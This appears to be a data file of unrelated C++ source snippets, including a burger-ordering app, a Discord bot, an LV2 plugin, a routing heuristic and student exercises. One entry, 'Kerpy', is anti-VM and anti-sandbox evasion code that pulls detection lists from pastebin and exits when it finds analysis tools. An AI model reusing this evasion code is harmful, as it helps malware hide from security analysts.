int sizeChoice;\n    cin >> sizeChoice;\n    if (sizeChoice == 0) {\n        return;\n    }\n\n    order.size = (sizeChoice == 1) ? \"Egg\" : ((sizeChoice == 2) ? \"Fish\" : \"Chicken\");\n    order.totalPrice += (sizeChoice == 1) ? 5.0 : ((sizeChoice == 2) ? 8.50 : 10.25);\n\n    cout << \"You have selected a \" << order.size << \" Burger.\\n\";\n    cout << \"........................................\\n\";\n\n    cout << \"ORDER Burger - Select Sides\\n\";\n    cout << \"You have selected a \" << order.size << \" Burger.\\n\";\n    cout << \"Please choose from the following Sides:\\n\\n\";\n\n    vector<Sides> sides;\n    sides.push_back(Sides());\n    sides.back().name = \"French Fries\";\n    sides.back().price = 0.80;\n\n    sides.push_back(Sides());\n    sides.back().name = \"Chicken Nuggets\";\n    sides.back().price = 0.50;\n\n    sides.push_back(Sides());\n    sides.back().name = \"Salad\";\n    sides.back().price = 0.80;\n\n    sides.push_back(Sides());\n    sides.back().name = \"Soda\";\n    sides.back().price = 0.40;\n\n    sides.push_back(Sides());\n    sides.back().name = \"Burger Meal(Burger + Fries + Soda)\";\n    sides.back().price = 1.00;\n\n    sides.push_back(Sides());\n    sides.back().name = \"Full Burger Meal(Burger + Fries + Nuggets + Salad + Soda)\";\n    sides.back().price = 1.50;\n\n\n\n    for (size_t i = 0; i < sides.size(); ++i) {\n        cout << \" \" << i + 1 << \". \" << sides[i].name << \" [\" << fixed << setprecision(2) << sides[i].price << \" credits]\\n\";\n    }\n\n    cout << \" 0. Return to Main Menu\\n\\n\";\n    cout << \"........................................\\n\";\n    cout << \"Please enter a number: \";\n\n    int sidesChoice; // Corrected variable name\n    cin >> sidesChoice;\n    if (sidesChoice == 0) {\n        return;\n    }\n\n    order.Sides.push_back(sides[sidesChoice - 1]);\n    order.totalPrice += sides[sidesChoice - 1].price;\n\n    cout << \"You have added \" << sides[sidesChoice - 1].name << \" to your Burger. Your current price is: \" << fixed << setprecision(2) << order.totalPrice << \" credits.\\n\";\n\n    char addMoreSides;\n    cout << \"Would you like to add additional Sides?\\nPlease input 'Y' for yes and 'N' for no: \";\n    cin >> addMoreSides;\n\n    while (addMoreSides == 'Y' || addMoreSides == 'y') {\n        cout << \"ORDER Burger - Select Sides\\n\";\n        cout << \"You have selected a \" << order.size << \" Burger.\\n\";\n        cout << \"Please choose from the following Sides:\\n\\n\";\n\n        for (size_t i = 0; i < sides.size(); ++i) {\n            cout << \" \" << i + 1 << \". \" << sides[i].name << \" [\" << fixed << setprecision(2) << sides[i].price << \" credits]\\n\";\n        }\n\n        cout << \" 0. Return to Main Menu\\n\\n\";\n        cout << \"........................................\\n\";\n        cout << \"Please enter a number: \";\n\n        cin >> sidesChoice;\n        if (sidesChoice == 0) {\n            break;\n        }\n\n        order.Sides.push_back(sides[sidesChoice - 1]);\n        order.totalPrice += sides[sidesChoice - 1].price;\n\n        cout << \"You have added \" << sides[sidesChoice - 1].name << \" to your Burger. Your current price is: \" << fixed << setprecision(2) << order.totalPrice << \" credits.\\n\";\n\n        cout << \"Would you like to add additional Sides?\\nPlease input 'Y' for yes and 'N' for no: \";\n        cin >> addMoreSides;\n    }\n}\n\nvoid checkout(Order& order) {\n    if (order.totalPrice <= credits) {\n        cout << \"Checking out...\\n\";\n        cout << \"........................................\\n\";\n        cout << \"Available Balanc",
    "#include <iostream>\r\n#include <fstream>\r\n#include <Windows.h>\r\n#include <winsock2.h>\r\n#include <iphlpapi.h>\r\n#include <vector>\r\n#include <algorithm>\r\n\r\n#pragma comment(lib, \"iphlpapi.lib\")\r\n#pragma comment(lib, \"ws2_32.lib\")\r\n\r\nclass Kerpy {\r\npublic:\r\n    void registryCheck() {\r\n        std::string cmd = \"REG QUERY HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\ControlSet001\\\\Control\\\\Class\\\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\\\0000\\\\\";\r\n        if (system((cmd + \"DriverDesc\").c_str()) == 0 || system((cmd + \"ProviderName\").c_str()) == 0) {\r\n            std::cout << \"VMware Registry Detected\" << std::endl;\r\n            exit(0);\r\n        }\r\n    }\r\n\r\n    void processesAndFilesCheck() {\r\n        std::string vmwareDll = getenv(\"SystemRoot\");\r\n        vmwareDll += \"\\\\System32\\\\vmGuestLib.dll\";\r\n        std::string virtualboxDll = getenv(\"SystemRoot\");\r\n        virtualboxDll += \"\\\\vboxmrxnp.dll\";\r\n\r\n        std::string process;\r\n        FILE* pipe = _popen(\"TASKLIST /FI \\\"STATUS eq RUNNING\\\" | find /V \\\"Image Name\\\" | find /V \\\"=\\\"\", \"r\");\r\n        char buffer[128];\r\n        while (fgets(buffer, 128, pipe) != NULL) {\r\n            process += buffer;\r\n        }\r\n        _pclose(pipe);\r\n\r\n        std::vector<std::string> processList;\r\n        size_t pos = 0;\r\n        while ((pos = process.find(\".exe\", pos)) != std::string::npos) {\r\n            processList.push_back(process.substr(0, pos + 4));\r\n            pos += 4;\r\n        }\r\n\r\n        if (std::find(processList.begin(), processList.end(), \"VMwareService.exe\") != processList.end() ||\r\n            std::find(processList.begin(), processList.end(), \"VMwareTray.exe\") != processList.end()) {\r\n            std::cout << \"VMwareService.exe & VMwareTray.exe process are running\" << std::endl;\r\n            exit(0);\r\n        }\r\n\r\n        if (GetFileAttributes(vmwareDll.c_str()) != INVALID_FILE_ATTRIBUTES) {\r\n            std::cout << \"Vmware DLL Detected\" << std::endl;\r\n            exit(0);\r\n        }\r\n\r\n        if (GetFileAttributes(virtualboxDll.c_str()) != INVALID_FILE_ATTRIBUTES) {\r\n            std::cout << \"VirtualBox DLL Detected\" << std::endl;\r\n            exit(0);\r\n        }\r\n\r\n        HMODULE sandboxieDll = LoadLibrary(\"SbieDll.dll\");\r\n        if (sandboxieDll != NULL) {\r\n            std::cout << \"Sandboxie DLL Detected\" << std::endl;\r\n            FreeLibrary(sandboxieDll);\r\n            exit(0);\r\n        }\r\n\r\n        std::ifstream processListFile(\"https://pastebin.com/raw/Xe5WMsTU\");\r\n        std::string processl;\r\n        while (std::getline(processListFile, processl)) {\r\n            if (std::find(processList.begin(), processList.end(), processl) != processList.end()) {\r\n                exit(0);\r\n            }\r\n        }\r\n    }\r\n\r\n    void macCheck() {\r\n        std::string macAddress = \"00:00:00:00:00:00\"; // Placeholder for getting MAC Address\r\n        std::ifstream macListFile(\"https://pastebin.com/raw/ftd50eAq\");\r\n        std::string mac;\r\n        while (std::getline(macListFile, mac)) {\r\n            if (macAddress.substr(0, 8) == mac) {\r\n                std::cout << \"VMware MAC Address Detected\" << std::endl;\r\n                exit(0);\r\n            }\r\n        }\r\n    }\r\n\r\n    void checkPc() {\r\n        std::string vmName;\r\n        std::string vmNameFileContent;\r\n        std::ifstream vmNameFile(\"https://pastebin.com/raw/jnEaykLU\");\r\n        std::getline(vmNameFile, vmNameFileContent);\r\n        if (vmName == vmNameFileContent) {\r\n            exit(0);\r\n        }\r\n\r\n        std::string vmUsername;\r\n        std::string hostName;\r\n        char hostNameBuffer[1024];\r\n        gethostname(hostNameBuffer, 1024);\r\n        hostName = hostNameBuffer;\r\n        std::ifstream vmUsernameFile(\"https://pastebin.com/raw/Vgztru48\");\r\n        std::getline(vmUsernameFile, vmUsername);\r\n        if (hostName == vmUsername) {\r\n            exit(0);\r\n        }\r\n    }\r\n\r\n    void hwidVm() {\r\n        std::string currentMachineId; // Placeholder for getting machine ID\r\n        std::ifstream hwidVmFile(\"https://pastebin.com/raw/E5pwq7NH\");\r\n        std::string hwid;\r\n        while (std::getline(hwidVmFile, hwid)) {\r\n            if (currentMachineId == hwid) {\r\n                exit(0);\r\n            }\r\n        }\r\n    }\r\n\r\n    void checkGpu() {\r\n        std::string gpuDescription;\r\n        std::ifstream gpuListFile(\"https://pastebin.com/raw/LSpkCfqc\");\r\n        std::string gpu;\r\n        while (std::getline(gpuListFile, gpu)) {\r\n            if (gpuDescription == gpu) {\r\n                exit(0);\r\n            }\r\n        }\r\n    }\r\n\r\n    void checkIp() {\r\n        std::ifstream ipListFile(\"https://pastebin.com/raw/tDXxxRUc\");\r\n        std::vector<std::string> ipList;\r\n        std::string ip;\r\n        while (std::getline(ipListFile, ip)) {\r\n            ipList.push_back(ip);\r\n        }\r\n\r\n        WSADATA wsaData;\r\n        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {\r\n            std::cerr << \"WSAStartup failed\" << std::endl;\r\n            return;\r\n        }\r\n\r\n        char ipBuffer[100];\r\n        if (gethostname(ipBuffer, ",
    "#include \"mcbot.h\"\n#include <thread>\n#include <chrono>\n\nconst char* t = \"********************\";//Discord bot token, replace with own token\nMCBot *instance;\n\nint main()\n{\n    instance = new MCBot(t);\n\n    auto c_socket = socket(AF_INET, SOCK_DGRAM, 0);\n    //auto s_socket = socket(AF_INET, SOCK_DGRAM, 0);\n    auto status_socket = socket(AF_INET, SOCK_DGRAM, 0);\n    auto c_socket_out = socket(AF_INET, SOCK_DGRAM, 0);\n    auto s_socket_out = socket(AF_INET, SOCK_DGRAM, 0);\n\n    sockaddr_in creative, survival, creative_out, survival_out, status;\n    set_sockaddr(creative, 60009);\n    //set_sockaddr(survival, 60010);\n    set_sockaddr(status, 60010);\n    set_sockaddr(creative_out, 60019);\n    set_sockaddr(survival_out, 60020);\n\n    bind(c_socket, (sockaddr*)&creative, sizeof creative);\n    bind(status_socket, (sockaddr*)&status, sizeof status);\n    //bind(s_socket, (sockaddr*)&survival, sizeof survival);\n\n    char buffer[257] = { 0 };\n    ssize_t bytes_read;\n\n    instance->s_socket_out = s_socket_out;\n    instance->c_socket_out = c_socket_out;\n\n    while (instance != nullptr) \n    {\n        if ((bytes_read = recv(c_socket, buffer, 257, MSG_DONTWAIT)) != -1)\n        {\n            buffer[256] = '\\0';\n            instance->str_vec.push_back(buffer + 1);\n            instance->msg_callback(buffer[0]);\n            instance->str_vec.clear();\n            memset(buffer, 0, 257);\n        }\n        if ((bytes_read = recv(status_socket, buffer, 257, MSG_DONTWAIT)) != -1)\n        {\n            buffer[256] = '\\0';\n            instance->str_vec.push_back(buffer + 1);\n            instance->status_callback(buffer[0]);\n            instance->str_vec.clear();\n            memset(buffer, 0, 257);\n        }\n        /*if ((bytes_read = recv(s_socket, buffer, 256, MSG_DONTWAIT)) != -1)\n        {\n            buffer[255] = '\\0';\n            instance->str_vec.push_back(buffer);\n            instance->msg_callback(false);\n            instance->str_vec.clear();\n            memset(buffer, 0, 256);\n        }*/\n        std::this_thread::sleep_for(std::chrono::milliseconds(1));\n    }\n\n    std::cout << \"\\nShutting down instance...\\n\";\n    close(c_socket);\n    close(status_socket);\n    //close(s_socket);\n    return 0;\n}\n",
    "/*libs*/\n#include <cstddef>\n#include <cstdint>\n#include <cstdlib>\n#include <cmath>\n#include <lv2.h>\n\n#define u32 uint32_t\n\n/*struct definition*/\n\nclass Nois_Generator {\n\n    private:\n\n        float* audio_out_ptr;\n        float* freq_ptr;\n        float* level_ptr;\n        double rate;\n        double position;\n\n\n    public:\n\n        Nois_Generator(const double sample_rate) {\n\n            audio_out_ptr = (float*) nullptr;\n            freq_ptr = (float *) nullptr;\n            level_ptr = (float *) nullptr;\n            rate = sample_rate;\n            position = 0.0;\n\n        }\n\n        //-Nois_Generator(); i use the default c++ destructor\n        \n        void connectPort(const u32 port, void* data_location) {\n\n            switch (port) {\n\n                case 0:\n                    audio_out_ptr = (float*) data_location;\n                    break;\n\n                case 1:\n                    freq_ptr = (float*) data_location;\n                    break;\n\n                case 2:\n                    level_ptr = (float*) data_location;\n                    break;\n\n                default:\n                    break;\n\n            }\n\n        }\n        void activate() {\n\n            position = 0.0;\n\n        }\n\n        void run(const u32 sample_count) {\n\n            if ((!audio_out_ptr) || (!freq_ptr) || (!level_ptr)) {\n\n                return;\n            \n            }\n\n            for (u32 i=0; i < sample_count; i++) {\n\n                audio_out_ptr[i] = sin(2.0 * M_PI * position) * *level_ptr;\n                \n                position += *freq_ptr / rate;\n            \n            }\n            \n            \n\n        }\n\n        //void deactivate(); for now not implemented\n};\n\n\n/*core methods*/\n//const char *URI\nstatic LV2_Handle instantiate(const struct LV2_Descriptor *descriptor, double sample_rate, const char *bundle_path, const LV2_Feature *const *features) {\n\n    Nois_Generator* ng = new Nois_Generator(sample_rate);\n\n    return ng;\n\n}\n\nstatic void connect_port(LV2_Handle instance, uint32_t port, void *data_location) {\n\n    Nois_Generator* ng = (Nois_Generator*) instance;\n\n    if(!ng) {\n\n        return;\n\n    }\n\n    ng->connectPort(port, data_location);\n\n\n}\n\nstatic void activate(LV2_Handle instance) {\n\n    Nois_Generator* ng = (Nois_Generator*) instance;\n\n    if (!ng) {\n\n        return;\n    \n    }\n\n    ng->activate();\n    \n\n}\n\nstatic void run(LV2_Handle instance, uint32_t sample_count) {\n\n    Nois_Generator* ng = (Nois_Generator*) instance;\n\n    if (!ng) {\n\n        return;\n    \n    }\n\n    ng->run(sample_count);\n\n}\n\nstatic void deactivate(LV2_Handle instance) {\n\n    //pass\n\n}\n\nstatic void cleanup(LV2_Handle instance) {\n\n    Nois_Generator *ng = (Nois_Generator *)instance;\n\n    if (!ng)\n    {\n\n        return;\n    }\n\n    delete ng;\n}\n\nstatic const void* extension_data(const char *uri) {\n\n    return NULL;\n\n}\n\n\n/*descriptor definition*/\n\nstatic LV2_Descriptor const descriptor = {\n\n    \"https://github.com/sudo-JACT/Sound_Havoc/tree/main/Sound_Havoc_Nois_Generator/src\",\n    instantiate,\n    connect_port,\n    activate,\n    run,\n    deactivate,\n    cleanup,\n    extension_data\n\n};\n\n/*interface*/\nextern \"C\" LV2_Descriptor const *lv2_descriptor(uint32_t index) {\n\n    if(index == 0) {\n\n        return &descriptor;\n\n    }else {\n\n        return NULL;\n\n    }\n\n}",
    "#include <webserver.hpp>\n\nnamespace utils\n{\n\t//orthodoxical cannonical form\n\tUtils::Utils()\n\t{\n        _HttpStatusCode[100] = \"Continue\";\n        _HttpStatusCode[101] = \"Switching Protocols\";\n        _HttpStatusCode[102] = \"Processing\";\n        _HttpStatusCode[103] = \"Early Hints\";\n        _HttpStatusCode[200] = \"OK\";\n        _HttpStatusCode[201] = \"Created\";\n        _HttpStatusCode[202] = \"Accepted\";\n        _HttpStatusCode[203] = \"Non-Authoritative Information\";\n        _HttpStatusCode[204] = \"No Content\";\n        _HttpStatusCode[205] = \"Reset Content\";\n        _HttpStatusCode[206] = \"Partial Content\";\n        _HttpStatusCode[207] = \"Multi-Status\";\n        _HttpStatusCode[208] = \"Already Reported\";\n        _HttpStatusCode[226] = \"IM Used\";\n        _HttpStatusCode[300] = \"Multiple Choices\";\n        _HttpStatusCode[301] = \"Moved Permanently\";\n        _HttpStatusCode[302] = \"Found\";\n        _HttpStatusCode[303] = \"See Other\";\n        _HttpStatusCode[304] = \"Not Modified\";\n        _HttpStatusCode[305] = \"Use Proxy\";\n        _HttpStatusCode[307] = \"Temporary Redirect\";\n        _HttpStatusCode[308] = \"Permanent Redirect\";\n        _HttpStatusCode[400] = \"Bad Request\";\n        _HttpStatusCode[401] = \"Unauthorized\";\n        _HttpStatusCode[402] = \"Payment Required\";\n        _HttpStatusCode[403] = \"Forbidden\";\n        _HttpStatusCode[404] = \"Not Found\";\n        _HttpStatusCode[405] = \"Method Not Allowed\";\n        _HttpStatusCode[406] = \"Not Acceptable\";\n        _HttpStatusCode[407] = \"Proxy Authentication Required\";\n        _HttpStatusCode[408] = \"Request Timeout\";\n        _HttpStatusCode[409] = \"Conflict\";\n        _HttpStatusCode[410] = \"Gone\";\n        _HttpStatusCode[411] = \"Length Required\";\n        _HttpStatusCode[412] = \"Precondition Failed\";\n        _HttpStatusCode[413] = \"Payload Too Large\";\n        _HttpStatusCode[414] = \"URI Too Long\";\n        _HttpStatusCode[415] = \"Unsupported Media Type\";\n        _HttpStatusCode[416] = \"Range Not Satisfiable\";\n        _HttpStatusCode[417] = \"Expectation Failed\";\n        _HttpStatusCode[418] = \"I'm a teapot\";\n        _HttpStatusCode[421] = \"Misdirected Request\";\n        _HttpStatusCode[422] = \"Unprocessable Entity\";\n        _HttpStatusCode[423] = \"Locked\";\n        _HttpStatusCode[424] = \"Failed Dependency\";\n        _HttpStatusCode[425] = \"Too Early\";\n        _HttpStatusCode[426] = \"Upgrade Required\";\n        _HttpStatusCode[428] = \"Precondition Required\";\n        _HttpStatusCode[429] = \"Too Many Requests\";\n        _HttpStatusCode[431] = \"Request Header Fields Too Large\";\n        _HttpStatusCode[451] = \"Unavailable For Legal Reasons\";\n        _HttpStatusCode[500] = \"Internal Server Error\";\n        _HttpStatusCode[501] = \"Not Implemented\";\n        _HttpStatusCode[502] = \"Bad Gateway\";\n        _HttpStatusCode[503] = \"Service Unavailable\";\n        _HttpStatusCode[504] = \"Gateway Timeout\";\n        _HttpStatusCode[505] = \"HTTP Version Not Supported\";\n        _HttpStatusCode[506] = \"Variant Also Negotiates\";\n        _HttpStatusCode[507] = \"Insufficient Storage\";\n        _HttpStatusCode[508] = \"Loop Detected\";\n        _HttpStatusCode[510] = \"Not Extended\";\n        _HttpStatusCode[511] = \"Network Authentication Required\";\n\t}\n\n\tUtils::Utils(const Utils &copy)\n\t{\n\t\t*this = copy;\n\t}\n\n\n\tUtils &Utils::operator=(const Utils &copy)\n\t{\n\t\tif (this != &copy)\n\t\t{\n\n\t\t}\n\t\treturn *this;\n\t}\n\n\tUtils::~Utils() { }\n\n\t//getters\n\tstd::map<int, std::string> Utils::getHttpStatusCode() const\n\t{\n\t\treturn _HttpStatusCode;\n\t}\n\n\t//util functions\n\tbool Utils::hasInvalidURICharacters(const std::string &str)\n\t{\n\t\tstd::string invalidChars = \" \\t\\n\\r\\f\\a\\b\\e\\v\";\n\t\tstd::string traversalSequence = \"../\"; //for security reasons\n\n\t\tif (str.find_first_of(invalidChars) != std::string::npos ||\n\t\t\tstr.find(traversalSequence) != std::string::npos)\n\t\t{\n\t\t\treturn true;\n\t\t}\n\t\treturn false;\n\t}\n}\n",
    "//\n// Created by Kyrie Zhang on 2023/12/16.\n//\n\n#include <find_max_vertices.h>\n\nvoid find_max_vertices(\n        std::vector<size_t> &indices,\n        Eigen::Ref<const Eigen::MatrixXd> V,\n        double tol) {\n\n    double max_vertex = V(0,1);\n\n    for(unsigned int vi=0; vi<V.rows(); ++vi) {\n        max_vertex = (V(vi,1) > max_vertex ? V(vi,1) : max_vertex);\n    }\n\n    for(unsigned int vi=0; vi<V.rows(); ++vi) {\n\n        if(std::abs(V(vi,1)-max_vertex) <= tol) {\n            indices.push_back(vi);\n        }\n    }\n}\n\nvoid findMultiMaxVertices(\n        std::vector<std::vector<size_t>>& indices,\n        const std::vector<SoftBody>& objects,\n        const std::vector<int>& fixedObjs,\n        double tol) {\n    indices.resize(fixedObjs.size());\n    for (int n = 0; n < fixedObjs.size(); n++) {\n        int id = fixedObjs[n];\n        const SoftBody& obj = objects[id];\n        Eigen::Ref<const Eigen::MatrixXd> V = obj.V;\n\n        double maxVertex = V(0, 1);\n\n        for(unsigned int vi=0; vi<V.rows(); ++vi) {\n            maxVertex = (V(vi,1) > maxVertex ? V(vi,1) : maxVertex);\n        }\n\n        for(unsigned int vi=0; vi<V.rows(); ++vi) {\n            if(std::abs(V(vi,1)-maxVertex) <= tol) {\n                indices[n].push_back(vi);\n            }\n        }\n    }\n}",
    "#include \"LocalSearches.h\"\n\nbool LocalSearches::IR_1opt(Solution & solution, LS_strat search_strat) {\n\n    int num_requests = Instance::instance()->num_requests();\n    bool improve, general_improvement, is_pickup, best_is_pickup;\n    int curr_pos, curr_vhc, best_orig_pos = -1, best_dest_pos = -1, best_vhc = -1, selected_req;\n    double best_cost, temp_cost, current_cost;\n\n    vector<int> selectable_nodes(2 * num_requests);\n    iota(selectable_nodes.begin(), selectable_nodes.end(), 1);\n    shuffle(selectable_nodes.begin(), selectable_nodes.end(), rand_utils::generator);\n\n    general_improvement = false;\n    improve = true;\n    while (improve) {\n        improve = false;\n        best_cost = solution.cost_;\n\n        for (auto selected_node = selectable_nodes.begin(); selected_node != selectable_nodes.end(); ++selected_node) {\n\n            is_pickup = *selected_node <= num_requests ? true : false;\n            Routes & routes = is_pickup ? solution.routes_pickup_ : solution.routes_delivery_;\n            selected_req = is_pickup ? *selected_node : *selected_node - num_requests;\n            curr_vhc = is_pickup ? solution.schedule_manager_.pic_del_[selected_req].first : solution.schedule_manager_.pic_del_[selected_req].second;\n            curr_pos = find(routes[curr_vhc].visited_nodes_.begin(), routes[curr_vhc].visited_nodes_.end(), *selected_node) - routes[curr_vhc].visited_nodes_.begin();\n\n            temp_cost = solution.cost_;\n\n            for (int j = Route::first_insertable_pos_; j <= routes[curr_vhc].last_insertable_pos_; ++j) {\n                if (j != curr_pos && j != curr_pos + 1) {\n                    current_cost = temp_cost + (is_pickup ? IR_1opt_pickup_delta_cost(solution, curr_vhc, curr_pos, j) : IR_1opt_delivery_delta_cost(solution, curr_vhc, curr_pos, j));\n\n                    if (cmp(current_cost, best_cost) < 0) {\n                        best_cost = current_cost;\n                        best_vhc = curr_vhc;\n                        best_orig_pos = curr_pos;\n                        best_dest_pos = j;\n                        best_is_pickup = is_pickup;\n                        improve = true;\n                    }\n                }\n            }\n\n            if (improve && (search_strat == LS_strat::complete_first_improv_ || search_strat == LS_strat::one_first_improv_)) {\n                general_improvement = true;\n                if (best_dest_pos > best_orig_pos) {\n                    --best_dest_pos;\n                }\n                if (best_is_pickup) {\n                    IR_move_1opt_pickup_route(solution, best_vhc, best_orig_pos, best_dest_pos);\n                } else {\n                    IR_move_1opt_delivery_route(solution, best_vhc, best_orig_pos, best_dest_pos);\n                }\n\n                if (search_strat == LS_strat::complete_first_improv_) {\n                    shuffle(selectable_nodes.begin(), selectable_nodes.end(), rand_utils::generator);\n                    break;\n                } else {\n                    return general_improvement;\n                }\n            }\n        }\n\n        if (improve && (search_strat == LS_strat::complete_best_improv_ || search_strat == LS_strat::one_best_improv_)) {\n            general_improvement = true;\n            if (best_dest_pos > best_orig_pos) {\n                --best_dest_pos;\n            }\n            if (best_is_pickup) {\n                IR_move_1opt_pickup_route(solution, best_vhc, best_orig_pos, best_dest_pos);\n            } else {\n                IR_move_1opt_delivery_route(solution, best_vhc, best_orig_pos, best_dest_pos);\n            }\n\n            if (search_strat == LS_strat::one_best_improv_) {\n                return general_improvement;\n            }\n        }\n\n    }\n\n    return general_improvement;\n}\n\ndouble LocalSearches::IR_1opt_pickup_delta_cost(Solution & solution, const int route, const int orig_pos, const int dest_pos) {\n\n    int num_reqs = Instance::instance()->num_requests();\n    vector<double> req_start_unload(num_reqs + 1, -1.0);\n    double delta_cost = 0.0;\n    double vhc_route_cost;\n    double vhc_unload_end;\n\n    vhc_route_cost = solution.routes_pickup_[route].cost_\n                     + Instance::instance()->EdgeCost(solution.routes_pickup_[route].visited_nodes_[orig_pos - 1], solution.routes_pickup_[route].visited_nodes_[orig_pos + 1])\n                     - Instance::instance()->EdgeCost(solution.routes_pickup_[route].visited_nodes_[orig_pos - 1], solution.routes_pickup_[route].visited_nodes_[orig_pos])\n                     - Instance::instance()->EdgeCost(solution.routes_pickup_[route].visited_nodes_[orig_pos], solution.routes_pickup_[route].visited_nodes_[orig_pos + 1])\n                     - Instance::instance()->EdgeCost(solution.routes_pickup_[route].visited_nodes_[dest_pos - 1], solution.routes_pickup_[route].visited_nodes_[dest_pos])\n                     + Instance::instance()->EdgeCost(solution.routes_pickup_[route].visited_nodes_[dest_pos - 1], solution.routes_pickup_[route].visited_nodes_[orig_p",
    "// https://www.geeksforgeeks.org/problems/minimum-absolute-difference-in-bst-1665139652/1\n\n// [EASY - MEDIUM]\n\n// given is the binary search tree, we have to find the minimum absolute difference between any two nodes\n\n// ideas: inorder traversal of BST gives the sorted order, so the minimum absolute differnce can be found from consecutive pairs\n// sol1: store the inorder traversal: SC: O(N) \n// sol2: just store the last, and find the min absolute diff: SC: O(1)\n// TC (both): O(N), each node is visited once\n\n#include <bits/stdc++.h>\n\nusing namespace std;\n\n\nstruct Node {\n    Node *left = nullptr;\n    Node *right = nullptr;\n    int data = 0;\n};\nclass Solution\n{\n    private:\n    void inorderTraversal(Node *root, vector<int> &inorder) {\n        if (!root) return;\n        inorderTraversal(root->left, inorder);\n        inorder.push_back(root->data);\n        inorderTraversal(root->right, inorder);\n    }\n    \n    int minAbsoluteDiff(vector<int> &inorder, int n) {\n        int mini = INT_MAX;\n        for (int i = 1; i < n; i++) {\n            mini = min(mini, inorder[i] - inorder[i - 1]);\n        }\n        return mini;\n    }\n    public:\n    int absolute_diff(Node *root) {\n        // inorder traversal will give sorted order, then we can find the minimum absolute difference between neighbouring pairs\n        vector<int> inorder;\n        inorderTraversal(root, inorder);\n        return minAbsoluteDiff(inorder, inorder.size());\n    }\n};\n\nclass Solution2\n{\n    private:\n    void inorderModified(Node *root, int &last, int &mini) {\n        if (root->left) inorderModified(root->left, last, mini);\n        if (last != -1) mini = min(mini, abs(last - root->data));\n        last = root->data;\n        if (root->right) inorderModified(root->right, last, mini);\n    }\n    public:\n    int absolute_diff(Node *root) {\n        // another solution is that, we don't actually have to store the whole inorder traversal, instead, we just can store the last value, and find the minimum absolute difference with the current value\n        int last = -1, mini = INT_MAX;\n        inorderModified(root, last, mini);\n        return mini;\n    }\n};",
    "#include<iostream>\r\nusing namespace std;\r\n\r\nclass bank\r\n{\r\n\tstring address;\r\n\tstring location;\r\n\tint alcnum;\r\n\tint balance;\r\n\tint depo;\r\n\tint ch;\r\n\tpublic :\r\n\t\tbank();\r\n\t\tvoid account()\r\n\t\t{\r\n\t\t\tcout<<\"\\n\\n\\t\\t ATM ACCOUNT DEPOSIT SYSTEM\";\r\n\t\t\tcout<<\"\\n\\n\\t The account holder address is : \";\r\n\t\t\tcin>>address;\r\n\t\t\tcout<<\"\\n\\n\\t The branch location :\";\r\n\t\t\tcin>>location;\r\n\t\t\tcout<<\"\\n\\n\\t Account number :\";\r\n\t\t\tcin>>alcnum;\r\n\t\t\tbalance=200000;\r\n\t\t\tcout<<\"\\n\\n\\t Present available balance : Rs.\"<<balance;\r\n\t\t\tcout<<\"\\n\\n\\t Enter the amount to be deposited Rs :\";\r\n\t\t\tcin>>depo;\r\n\t\t\tcout<<\"\\n\\n\\t Your new available balanced amount is Rs.\"<<balance+depo;\r\n\t\t\tcout<<\"\\n\\n\\t\\t THANK YOU!\";\r\n\t\t\tcout<<\"\\n\\n\\t Press any key to return to the main menu..\";\r\n\t\t\t\r\n\t\t}\r\n\t\tvoid info()\r\n\t\t{\r\n\t\t\tswitch(ch)\r\n\t\t\t{\r\n\t\t\t\tcout<<\"\\n\\n\\t Press 1 and Then Press Enter to Access Your Account Via Pin Number\";\r\n\t\t\t\tcout<<\"\\n\\n\\t or\";\r\n\t\t\t\tcout<<\"\\n\\n\\t Press 0 And Press Enter To Get Help\";\r\n\t\t\t\t\r\n\t\t\t\tcase 0:\r\n\t\t\t\t\tcout<<\"\\n\\n\\t\\t ATM ACCOUNT STATUS\";\r\n\t\t\t\t\tcout<<\"\\n\\n\\t You must have the correct pin number to access this account.See your\";\r\n\t\t\t\t\tcout<<\"\\n\\t bank representation for assistance during bank opening hours\";\r\n\t\t\t\t\tcout<<\"\\n\\t Thanks for,your choice today!!\";\r\n\t\t\t\t\tcout<<\"\\n\\n\\t Press any key to continue.......\";\r\n\t\t\t\t\t\r\n\t\t\t\tcase 1:\r\n\t\t\t\t\tcout<<\"Enter Your Pin Access Number! [Only one attempt is allowed]\";\r\n\t\t\t\t\t\r\n\t\t\t\t\tint pin;\r\n\t\t\t\t\tcout<<\"\\n\\n\\t Pin :\";\r\n\t\t\t\t\tcin>>pin;\r\n\t\t\t\t\tif(pin=12345)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t\\t ATM MAIN MENU SCREEN\";\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t Enter [1] To Deposite Cash\";\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t Enter [2] To Withdraw Cash\";\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t Enter [3] To Balance Cash\";\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t Enter [0] To Exit ATM\";\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t PLEASE ENTER A SELECTION AND PREE RETURN KEY:\";\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse \r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t\\t THANK YOU\";\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t You had made your attempt which failed !! No More attemps allowed!! Sorry!!\";\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t Press any key to continue.......\";\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t}\r\n\t\t\t}\r\n\t}\r\n};\r\n\t\t\r\n\t\tbank :: bank()\r\n\t\t{\r\n\t\t\tcout<<\"\\n\\n\\t\\t  WELCOME TO ATM\";\r\n\t\t\tcout<<\"\\n\\t............................................. \";\r\n\t\t\tcout<<\"\\n\\n\\t Current date : Mon Aug 22 12 15:00:59 2022\";\r\n\t\t\tcout<<\"\\n\\t............................................. \";\r\n\t\t\tint ch;\r\n\t\t\tswitch(ch)\r\n\t\t\t{\r\n\t\t\t\tcout<<\"\\n\\n\\t Press 1 and Then Press Enter to Access Your Account Via Pin Number\";\r\n\t\t\t\tcout<<\"\\n\\n\\t or\";\r\n\t\t\t\tcout<<\"\\n\\n\\t Press 0 And Press Enter To Get Help\";\r\n\t\t\t\t\r\n\t\t\t\tcase 0:\r\n\t\t\t\t\tcout<<\"\\n\\n\\t\\t ATM ACCOUNT STATUS\";\r\n\t\t\t\t\tcout<<\"\\n\\n\\t You must have the correct pin number to access this 